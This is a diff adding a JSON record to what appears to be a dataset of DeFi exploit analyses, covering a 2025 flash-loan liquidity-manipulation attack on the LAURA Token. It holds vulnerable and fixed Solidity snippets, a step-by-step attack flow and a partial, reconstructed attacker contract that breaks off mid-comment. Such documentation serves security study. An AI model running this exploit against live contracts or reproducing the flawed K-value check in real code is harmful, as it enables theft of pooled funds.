@@ -1,0 +1,36 @@
+{
+ "id": "2025__2025-01-06_LAURAToken_LiquidityManipulation",
+ "source_file": "2025/2025-01-06_LAURAToken_LiquidityManipulation.md",
+ "title": "LAURA Token — Analysis of Abnormal Withdrawal via Liquidity Manipulation",
+ "date": "2025-01-06",
+ "protocol": "LAURA Token",
+ "chain": "Ethereum",
+ "loss_raw": "~$41,200 (12.34 ETH)",
+ "loss_usd": 41200.0,
+ "root_cause": "`removeLiquidityWhenKIncreases` function callable under imbalanced liquidity pair state, allowing excess withdrawal",
+ "attack_tx": "0xef34...420",
+ "vulnerable_contract": "LAURA Token liquidity contract (Ethereum; full address not publicly confirmed)",
+ "classes": [
+  "oracle-price-manipulation"
+ ],
+ "code_before": [
+  "❌ Vulnerable code: only checks K value increase condition, ignores manipulation possibility\nfunction removeLiquidityWhenKIncreases(uint256 liquidity) external {\n    uint256 currentK = reserve0 * reserve1;\n    // Allows liquidity removal if K exceeds initial value — manipulable via flash loan\n    require(currentK > initialK, \"K not increased\");\n    _removeLiquidity(msg.sender, liquidity);\n}\n\n//"
+ ],
+ "code_after": [
+  "✅ Safe code: flash loan defense and time-weighted average K value\nfunction removeLiquidityWhenKIncreases(uint256 liquidity) external {\n    require(!isFlashLoan, \"No flash loan\");          // Prevent reentrancy/flash loan\n    uint256 twapK = getTWAPK();                      // Use TWAP-based K value\n    require(twapK > initialK, \"K not increased\");\n    _removeLiquidity(msg.sender, liquidity);\n}"
+ ],
+ "steps": [
+  "→ [1] Obtain 30,000 WETH flash loan from Balancer",
+  "→ [2] Swap WETH → LAURA (MAGIC_NUMBER: 11526249223479392795400)",
+  "LAURA pool WETH balance surges → K value artificially inflated",
+  "→ [3] Add liquidity to LAURA/WETH pair (acquire LP tokens)",
+  "→ [4] Call removeLiquidityWhenKIncreases()",
+  "K value condition satisfied → excess liquidity removal allowed",
+  "→ [5] Swap remaining LAURA → WETH",
+  "→ [6] Repay flash loan and collect profit (~12.34 ETH)"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─→ [1] Obtain 30,000 WETH flash loan from Balancer\n  │\n  ├─→ [2] Swap WETH → LAURA (MAGIC_NUMBER: 11526249223479392795400)\n  │         └─ LAURA pool WETH balance surges → K value artificially inflated\n  │\n  ├─→ [3] Add liquidity to LAURA/WETH pair (acquire LP tokens)\n  │\n  ├─→ [4] Call removeLiquidityWhenKIncreases()\n  │         └─ K value condition satisfied → excess liquidity removal allowed\n  │\n  ├─→ [5] Swap remaining LAURA → WETH\n  │\n  └─→ [6] Repay flash loan and collect profit (~12.34 ETH)",
+  "// PoC not fully obtained — reconstructed from WebFetch summary\n\ncontract AttackerC0 {\n    function attack() external {\n        // [1] Request 30,000 WETH flash loan from Balancer\n        IBalancerVault(BALANCER).flashLoan(\n            address(this),\n            tokens,\n            amounts, // 30,000 WETH\n            \"\"\n        );\n    }\n}\n\ncontract AttackerC1 {\n    function receiveFlashLoan(...) external {\n        // [2] Swap WETH → LAURA using MAGIC_NUMBER\n        // MAGIC_NUMBER = 11526249223479392795400\n        // Large swap artificially inflates pool's K value\n        router.swapExactTokensForTokens(MAGIC_NUMBER, ...);\n\n        // [3] Add liquidity (acquire LP tokens)\n        router.addLiquidity(LAURA, WETH, ...);\n\n        // [4] Trigger K value increase condition → abnormal liquidity "
+ ]
+}
